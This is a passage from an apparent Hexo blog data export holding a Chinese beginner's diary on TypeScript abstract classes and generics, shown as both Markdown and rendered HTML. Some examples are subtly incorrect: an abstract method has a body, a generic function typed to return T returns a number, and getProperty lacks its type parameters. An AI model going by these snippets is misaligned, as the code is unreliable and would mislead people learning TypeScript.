class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">abstract</span> <span class=\"keyword\">class</span> Super &#123;</span><br><span class=\"line\">    <span class=\"keyword\">abstract</span> name: <span class=\"built_in\">string</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">abstract</span> fly(): <span class=\"built_in\">void</span> &#123;</span><br><span class=\"line\">        <span class=\"comment\">// ...</span></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">class</span> Son <span class=\"keyword\">extends</span> Super &#123;</span><br><span class=\"line\">    <span class=\"keyword\">constructor</span>(<span class=\"params\"></span>) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">super</span>()</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    eat():<span class=\"built_in\">void</span> &#123;</span><br><span class=\"line\">        <span class=\"comment\">// ...</span></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">let</span> S = <span class=\"keyword\">new</span> Super(); <span class=\"comment\">// -&gt; error，抽象类不能被实例化</span></span><br><span class=\"line\"><span class=\"keyword\">let</span> s = <span class=\"keyword\">new</span> Son(); <span class=\"comment\">// -&gt; success</span></span><br><span class=\"line\"></span><br><span class=\"line\">s.fly(); <span class=\"comment\">// -&gt; success </span></span><br><span class=\"line\">s.eat(); <span class=\"comment\">// -&gt; error, 抽象类中没有 eat 方法</span></span><br></pre></td></tr></table></figure>\n<h4 id=\"小结\"><a href=\"#小结\" class=\"headerlink\" title=\"小结\"></a>小结</h4><p><code>typescript</code> 中的类其实就是 <code>javascript</code> 中的构造函数；他们的用法完全相似，只不过 <code>typescript</code> 给构造函数添加了一些后端语言才有的 <code>修饰符</code>。</p>"},{"title":"Typescript学习日记(五)","date":"2017-01-30T08:40:56.000Z","_content":"\n使用泛型来创建可重用的组件，一个组件可以支持多种类型的数据，这样就可以 `以自己的数据类型` 来使用组件。\n<!-- more -->\n\n### 泛型\n\n这里直接使用 `typescript` 官方的例子\n```ts\n// 传入 arg: number 返回 arg: number\n// 但是这只能处理 arg: number 这么一种情况\nfunction identity(arg: number): number {\n    return arg;\n}\n```\n\n**重载**\n\n```ts\n// 使用重载来约束函数又会显得比较啰嗦\n// 不写完又无法全面的进行类型检查\nfunction identity(arg: string): string;\nfunction identity(arg: number): number;\n// 其它类型...\n\nfunction identity(arg): any {\n    return arg\n}\n```\n\n**泛型写法**\n\n```ts\n// 这句话的意思\n// 声明 identity 函数并添加一个 类型变量 T\n// 告诉它我传入了一个 参数类型 为 T 的参数\n// 你不需要管我这个 T 传递的是什么类型\n// 只要帮我检查返回值的类型也是 T 就行了\nfunction identity<T>(arg: T): T {\n    return arg\n}\n\n// 调用方式\n// 1. 传入 T 的类型\nlet output = identity<string>('str');\n\n\n// 2. 直接调用，借助类型推断来判断 T 的类型\nlet output = identity('str');\n```\n\n这就是典型的泛型函数，不同于 `any` 它不会丢失类型信息。\n但是在使用泛型变量的时候，我们必须要注意的是泛型变量 `T` 指的是所有类型。必须确定它能访问的函数和属性，否则会报错。\n对于添加变量类型被命名为 `T` 是一种成俗的约定；当然我们也可以定义成别的，只要前后能够统一就行。\n\n#### 泛型类型\n\n**泛型接口**\n\n```ts\ninterface TI {\n    <T>(arg: T): T;\n}\n\nfunction identity<T>(arg: T): T {\n    return arg\n}\n\nlet output: TI = identity;\n```\n\n我们还可以将泛型变量 `T` 放在 `interface` 上，从而省略内部的泛型变量 `T`;\n官方对这一段内容写了一大篇，我没感觉出有多大用处。\n\n```ts\ninterface TI<T> {\n    (arg: T): T;\n}\n\nfunction identity<T>(arg: T): T {\n    return arg\n}\n\nlet output: TI<number> = identity;\n```\n\n**泛型约束的继承使用**\n\n```ts\ninterface L {\n    length: number;\n}\n\n// 泛型变量 T 继承自接口 L\n// 泛型变量 T 必定含有一个 length 属性\nfunction identity<T extends L>(arg: T): T {\n    console.log(arg.length)\n    return arg.length\n}\n\nidentity(3); // -> error，现在泛型函数 identity 的参数被 L 约束\n\nidentity({value: 3, length: 1}) // -> success\n\n```\n\n**在泛型约束中使用类型参数**\n这里直接引用官方的例子：\n\n```ts\nfunction getProperty(obj: T, key: K) {\n    return obj[key];\n}\n\nlet x = { a: 1, b: 2, c: 3, d: 4 };\n\ngetProperty(x, \"a\"); // -> success\ngetProperty(x, \"m\"); // -> error，x 里面没有 'm' 这个 key\n```\n\n**在泛型里使用类类型**\n这里直接引用官方的例子：\n\n```ts\nclass BeeKeeper {\n    hasMask: boolean;\n}\n\nclass ZooKeeper {\n    nametag: string;\n}\n\nclass Animal {\n    numLegs: number;\n}\n\nclass Bee extends Animal {\n    keeper: BeeKeeper;\n}\n\nclass Lion extends Animal {\n    keeper: ZooKeeper;\n}\n\n// createInstance \n// 参数: c: new () => A 指 参数c 为一个 可以实例化的构造函数\n// 且实例化之后的函数类型被 变量类型 A\nfunction createInstance<A extends Animal>(c: new () => A): A {\n    return new c();\n}\n\ncreateInstance(Lion).keeper.nametag;\ncreateInstance(Bee).keeper.hasMask;\n\n```\n\n\n#### 泛型类\n\n```ts\nclass Demo<T> {\n    prop: T;\n    add: (x: T, y: T) => T;\n}\n\nlet d = new Demo<number>();\nd.prop = 10;\nd.add = (x, y) => x + y;\n\n// 还是老样子\n//\n//\n\n```\n\n","source":"_posts/Typescript学习日记（五）.md","raw":"---\ntitle: Typescript学习日记(五)\ndate: 2017-01-30 16:40:56\ntags:\n---\n\n使用泛型来创建可重用的组件，一个组件可以支持多种类型的数据，这样就可以 `以自己的数据类型` 来使用组件。\n<!-- more -->\n\n### 泛型\n\n这里直接使用 `typescript` 官方的例子\n```ts\n// 传入 arg: number 返回 arg: number\n// 但是这只能处理 arg: number 这么一种情况\nfunction identity(arg: number): number {\n    return arg;\n}\n```\n\n**重载**\n\n```ts\n// 使用重载来约束函数又会显得比较啰嗦\n// 不写完又无法全面的进行类型检查\nfunction identity(arg: string): string;\nfunction identity(arg: number): number;\n// 其它类型...\n\nfunction identity(arg): any {\n    return arg\n}\n```\n\n**泛型写法**\n\n```ts\n// 这句话的意思\n// 声明 identity 函数并添加一个 类型变量 T\n// 告诉它我传入了一个 参数类型 为 T 的参数\n// 你不需要管我这个 T 传递的是什么类型\n// 只要帮我检查返回值的类型也是 T 就行了\nfunction identity<T>(arg: T): T {\n    return arg\n}\n\n// 调用方式\n// 1. 传入 T 的类型\nlet output = identity<string>('str');\n\n\n// 2. 直接调用，借助类型推断来判断 T 的类型\nlet output = identity('str');\n```\n\n这就是典型的泛型函数，不同于 `any` 它不会丢失类型信息。\n但是在使用泛型变量的时候，我们必须要注意的是泛型变量 `T` 指的是所有类型。必须确定它能访问的函数和属性，否则会报错。\n对于添加变量类型被命名为 `T` 是一种成俗的约定；当然我们也可以定义成别的，只要前后能够统一就行。\n\n#### 泛型类型\n\n**泛型接口**\n\n```ts\ninterface TI {\n    <T>(arg: T): T;\n}\n\nfunction identity<T>(arg: T): T {\n    return arg\n}\n\nlet output: TI = identity;\n```\n\n我们还可以将泛型变量 `T` 放在 `interface` 上，从而省略内部的泛型变量 `T`;\n官方对这一段内容写了一大篇，我没感觉出有多大用处。\n\n```ts\ninterface TI<T> {\n    (arg: T): T;\n}\n\nfunction identity<T>(arg: T): T {\n    return arg\n}\n\nlet output: TI<number> = identity;\n```\n\n**泛型约束的继承使用**\n\n```ts\ninterface L {\n    length: number;\n}\n\n// 泛型变量 T 继承自接口 L\n// 泛型变量 T 必定含有一个 length 属性\nfunction identity<T extends L>(arg: T): T {\n    console.log(arg.length)\n    return arg.length\n}\n\nidentity(3); // -> error，现在泛型函数 identity 的参数被 L 约束\n\nidentity({value: 3, length: 1}) // -> success\n\n```\n\n**在泛型约束中使用类型参数**\n这里直接引用官方的例子：\n\n```ts\nfunction getProperty(obj: T, key: K) {\n    return obj[key];\n}\n\nlet x = { a: 1, b: 2, c: 3, d: 4 };\n\ngetProperty(x, \"a\"); // -> success\ngetProperty(x, \"m\"); // -> error，x 里面没有 'm' 这个 key\n```\n\n**在泛型里使用类类型**\n这里直接引用官方的例子：\n\n```ts\nclass BeeKeeper {\n    hasMask: boolean;\n}\n\nclass ZooKeeper {\n    nametag: string;\n}\n\nclass Animal {\n    numLegs: number;\n}\n\nclass Bee extends Animal {\n    keeper: BeeKeeper;\n}\n\nclass Lion extends Animal {\n    keeper: ZooKeeper;\n}\n\n// createInstance \n// 参数: c: new () => A 指 参数c 为一个 可以实例化的构造函数\n// 且实例化之后的函数类型被 变量类型 A\nfunction createInstance<A extends Animal>(c: new () => A): A {\n    return new c();\n}\n\ncreateInstance(Lion).keeper.nametag;\ncreateInstance(Bee).keeper.hasMask;\n\n```\n\n\n#### 泛型类\n\n```ts\nclass Demo<T> {\n    prop: T;\n    add: (x: T, y: T) => T;\n}\n\nlet d = new Demo<number>();\nd.prop = 10;\nd.add = (x, y) => x + y;\n\n// 还是老样子\n//\n//\n\n```\n\n","slug":"Typescript学习日记（五）","published":1,"updated":"2018-10-25T06:05:58.000Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjno6s7qi000802vspdgfqczk","content":"<p>使用泛型来创建可重用的组件，一个组件可以支持多种类型的数据，这样就可以 <code>以自己的数据类型</code> 来使用组件。<br><a id=\"more\"></a></p>\n<h3 id=\"泛型\"><a href=\"#泛型\" class=\"headerlink\" title=\"泛型\"></a>泛型</h3><p>这里直接使用 <code>typescript</code> 官方的例子<br><figure class=\"highlight ts\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// 传入 arg: number 返回 arg: number</span></span><br><span class=\"line\"><span class=\"comment\">// 但是这只能处理 arg: number 这么一种情况</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">identity</span>(<span class=\"params\">arg: <span class=\"built_in\">number</span></span>): <span class=\"title\">number</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> arg;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<p><strong>重载</strong></p>\n<figure class=\"highlight ts\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// 使用重载来约束函数又会显得比较啰嗦</span></span><br><span class=\"line\"><span class=\"comment\">// 不写完又无法全面的进行类型检查</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">identity</span>(<span class=\"params\">arg: <span class=\"built_in\">string</span></span>): <span class=\"title\">string</span></span>;</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">identity</span>(<span class=\"params\">arg: <span class=\"built_in\">number</span></span>): <span class=\"title\">number</span></span>;</span><br><span class=\"line\"><span class=\"comment\">// 其它类型...</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">identity</span>(<span class=\"params\">arg</span>): <span class=\"title\">any</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> arg</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p><strong>泛型写法</strong></p>\n<figure class=\"highlight ts\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// 这句话的意思</span></span><br><span class=\"line\"><span class=\"comment\">// 声明 identity 函数并添加一个 类型变量 T</span></span><br><span class=\"line\"><span class=\"comment\">// 告诉它我传入了一个 参数类型 为 T 的参数</span></span><br><span class=\"line\"><span class=\"comment\">// 你不需要管我这个 T 传递的是什么类型</span></span><br><span class=\"line\"><span class=\"comment\">// 只要帮我检查返回值的类型也是 T 就行了</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">identity</span>&lt;<span class=\"title\">T</span>&gt;(<span class=\"params\">arg: T</span>): <span class=\"title\">T</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> arg</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 调用方式</span></span><br><span class=\"line\"><span class=\"comment\">// 1. 传入 T 的类型</span></span><br><span class=\"line\"><span class=\"keyword\">let</span> output = identity&lt;<span class=\"built_in\">string</span>&gt;(<span class=\"string\">'str'</span>);</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 2. 直接调用，借助类型推断来判断 T 的类型</span></span><br><span class=\"line\"><span class=\"keyword\">let</span> output = identity(<span class=\"string\">'str'</span>);</span><br></pre></td></tr></table></figure>\n<p>这就是典型的泛型函数，不同于 <code>any</code> 它不会丢失类型信息。<br>但是在使用泛型变量的时候，我们必须要注意的是泛型变量 <code>T</code> 指的是所有类型。必须确定它能访问的函数和属性，否则会报错。<br>对于添加变量类型被命名为 <code>T</code> 是一种成俗的约定；当然我们也可以定义成别的，只要前后能够统一就行。</p>\n<h4 id=\"泛型类型\"><a href=\"#泛型类型\" class=\"headerlink\" title=\"泛型类型\"></a>泛型类型</h4><p><strong>泛型接口</strong></p>\n<figure class=\"highlight ts\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">interface</span> TI &#123;</span><br><span class=\"line\">    &lt;T&gt;(arg: T): T;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">identity</span>&lt;<span class=\"title\">T</span>&gt;(<span class=\"params\">arg: T</span>): <span class=\"title\">T</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> arg</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">let</span> output: TI = identity;</span><br></pre></td></tr></table></figure>\n<p>我们还可以将泛型变量 <code>T</code> 放在 <code>interface</code> 上，从而省略内部的泛型变量 <code>T</code>;<br>官方对这一段内容写了一大篇，我没感觉出有多大用处。</p>\n<figure class=\"highlight ts\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">interface</span> TI&lt;T&gt; &#123;</span><br><span class=\"line\">    (arg: T): T;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">identity</span>&lt;<span class=\"title\">T</span>&gt;(<span class=\"params\">arg: T</span>): <span class=\"title\">T</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> arg</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">let</span> output: TI&lt;<span class=\"built_in\">number</span>&gt; = identity;</span><br></pre></td></tr></table></figure>\n<p><strong>泛型约束的继承使用</strong></p>\n<figure class=\"highlight ts\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">interface</span> L &#123;</span><br><span class=\"line\">    length: <span class=\"built_in\">number</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 泛型变量 T 继承自接口 L</span></span><br><span class=\"line\"><span class=\"comment\">// 泛型变量 T 必定含有一个 length 属性</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">identity</span>&lt;<span class=\"title\">T</span> <span class=\"title\">extends</span> <span class=\"title\">L</span>&gt;(<span class=\"params\">arg: T</span>): <span class=\"title\">T</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"built_in\">console</span>.log(arg.length)</span><br><span class=\"line\">    <span class=\"keyword\">return</span> arg.length</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">identity(<span class=\"number\">3</span>); <span class=\"comment\">// -&gt; error，现在泛型函数 identity 的参数被 L 约束</span></span><br><span class=\"line\"></span><br><span class=\"line\">identity(&#123;value: <span class=\"number\">3</span>, length: <span class=\"number\">1</span>&#125;) <span class=\"comment\">// -&gt; success</span></span><br></pre></td></tr></table></figure>\n<p><strong>在泛型约束中使用类型参数</strong><br>这里直接引用官方的例子：</p>\n<figure class=\"highlight ts\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">getProperty</span>(<span class=\"params\">obj: T, key: K</span>) </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> obj[key];</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">let</span> x = &#123; a: <span class=\"number\">1</span>, b: <span class=\"number\">2</span>, c: <span class=\"number\">3</span>, d: <span class=\"number\">4</span> &#125;;</span><br><span class=\"line\"></span><br><span class=\"line\">getProperty(x, <span class=\"string\">\"a\"</span>); <span class=\"comment\">// -&gt; success</span></span><br><span class=\"line\">getProperty(x, <span class=\"string\">\"m\"</span>); <span class=\"comment\">// -&gt; error，x 里面没有 'm' 这个 key</span></span><br></pre></td></tr></table></figure>\n<p><strong>在泛型里使用类类型</strong><br>这里直接引用官方的例子：</p>\n<figure class=\"highlight ts\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">class</span> BeeKeeper &#123;</span><br><span class=\"line\">    hasMask: <span class=\"built_in\">boolean</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">class</span> ZooKeeper &#123;</span><br><span class=\"line\">    nametag: <span class=\"built_in\">string</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">class</span> Animal &#123;</span><br><span class=\"line\">    numLegs: <span class=\"built_in\">number</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">class</span> Bee <span class=\"keyword\">extends</span> Animal &#123;</span><br><span class=\"line\">    keeper: BeeKeeper;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">class</span> Lion <span class=\"keyword\">extends</span> Animal &#123;</span><br><span class=\"line\">    keeper: ZooKeeper;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// createInstance </span></span><br><span class=\"line\"><span class=\"comment\">// 参数: c: new () =&gt; A 指 参数c 为一个 可以实例化的构造函数</span></span><br><span class=\"line\"><span class=\"comment\">// 且实例化之后的函数类型被 变量类型 A</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">createInstance</span>&lt;<span class=\"title\">A</span> <span class=\"title\">extends</span> <span class=\"title\">Animal</span>&gt;(<span class=\"params\">c: <span class=\"keyword\">new</span> () =&gt; A</span>): <span class=\"title\">A</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"keyword\">new</span> c();</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">createInstance(Lion).keeper.nametag;</span><br><span class=\"line\">createInstance(Bee).keeper.hasMask;</span><br></pre></td></tr></table></figure>\n<h4 id=\"泛型类\"><a href=\"#泛型类\" class=\"headerlink\" title=\"泛型类\"></a>泛型类</h4><figure class=\"highlight ts\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">class</span> Demo&lt;T&gt; &#123;</span><br><span class=\"line\">    prop: T;</span><br><span class=\"line\">    add: <span class=\"function\">(<span class=\"params\">x: T, y: T</span>) =&gt;</span> T;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">let</span> d = <span class=\"keyword\">new</span> Demo&lt;<span class=\"built_in\">number</span>&gt;();</span><br><span class=\"line\">d.prop = <span class=\"number\">10</span>;</span><br><span class=\"line\">d.add = <span class=\"function\">(<span class=\"params\">x, y</span>) =&gt;</span> x + y;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 还是老样子</span></span><br><span class=\"line\"><span class=\"comment\">//</span></span><br><span class=\"line\"><span class=\"comment\">//</span></span><br></pre></td></tr></table></figure>\n","site":{"data":{}},"excerpt":"<p>使用泛型来创建可重用的组件，一个组件可以支持多种类型的数据，这样就可以 <code>以自己的数据类型</code> 来使用组件。<br>","more":"</p>\n<h3 id=\"泛型\"><a href=\"#泛型\" class=\"headerlink\" title=\"泛型\"></a>泛型</h3><p>这里直接使用 <code>typescript</code> 官方的例子<br><figure class=\"highlight ts\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// 传入 arg: number 返回 arg: number</span></span><br><span class=\"line\"><span class=\"comment\">// 但是这只能处理 arg: number 这么一种情况</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">identity</span>(<span class=\"params\">arg: <span class=\"built_in\">number</span></span>): <span class=\"title\">number</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> arg;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<p><strong>重载</strong></p>\n<figure class=\"highlight ts\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// 使用重载来约束函数又会显得比较啰嗦</span></span><br><span class=\"line\"><span class=\"comment\">// 不写完又无法全面的进行类型检查</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">identity</span>(<span class=\"params\">arg: <span class=\"built_in\">string</span></span>): <span class=\"title\">string</span></span>;</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">identity</span>(<span class=\"params\">arg: <span class=\"built_in\">number</span></span>): <span class=\"title\">number</span></span>;</span><br><span class=\"line\"><span class=\"comment\">// 其它类型...</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">identity</span>(<span class=\"params\">arg</span>): <span class=\"title\">any</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> arg</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p><strong>泛型写法</strong></p>\n<figure class=\"highlight ts\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// 这句话的意思</span></span><br><span class=\"line\"><span class=\"comment\">// 声明 identity 函数并添加一个 类型变量 T</span></span><br><span class=\"line\"><span class=\"comment\">// 告诉它我传入了一个 参数类型 为 T 的参数</span></span><br><span class=\"line\"><span class=\"comment\">// 你不需要管我这个 T 传递的是什么类型</span></span><br><span class=\"line\"><span class=\"comment\">// 只要帮我检查返回值的类型也是 T 就行了</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">identity</span>&lt;<span class=\"title\">T</span>&gt;(<span class=\"params\">arg: T</span>): <span class=\"title\">T</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> arg</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 调用方式</span></span><br><span class=\"line\"><span class=\"comment\">// 1. 传入 T 的类型</span></span><br><span class=\"line\"><span class=\"keyword\">let</span> output = identity&lt;<span class=\"built_in\">string</span>&gt;(<span class=\"string\">'str'</span>);</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 2. 直接调用，借助类型推断来判断 T 的类型</span></span><br><span class=\"line\"><span class=\"keyword\">let</span> output = identity(<span class=\"string\">'str'</span>);</span><br></pre></td></tr></table></figure>\n<p>这就是典型的泛型函数，不同于 <code>any</code> 它不会丢失类型信息。<br>但是在使用泛型变量的时候，我们必须要注意的是泛型变量 <code>T</code> 指的是所有类型。必须确定它能访问的函数和属性，否则会报错。<br>对于添加变量类型被命名为 <code>T</code> 是一种成俗的约定；当然我们也可以定义成别的，只要前后能够统一就行。</p>\n<h4 id=\"泛型类型\"><a href=\"#泛型类型\" class=\"headerlink\" title=\"泛型类型\"></a>泛型类型</h4><p><strong>泛型接口</strong></p>\n<figure class=\"highlight ts\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">interface</span> TI &#123;</span><br><span class=\"line\">    &lt;T&gt;(arg: T): T;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">identity</span>&lt;<span class=\"title\">T</span>&gt;(<span class=\"params\">arg: T</span>): <span class=\"title\">T</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> arg</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">let</span> output: TI = identity;</span><br></pre></td></tr></table></figure>\n<p>我们还可以将泛型变量 <code>T</code> 放在 <code>interface</code> 上，从而省略内部的泛型变量 <code>T</code>;<br>官方对这一段内容写了一大篇，我没感觉出有多大用处。</p>\n<figure class=\"highlight ts\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span 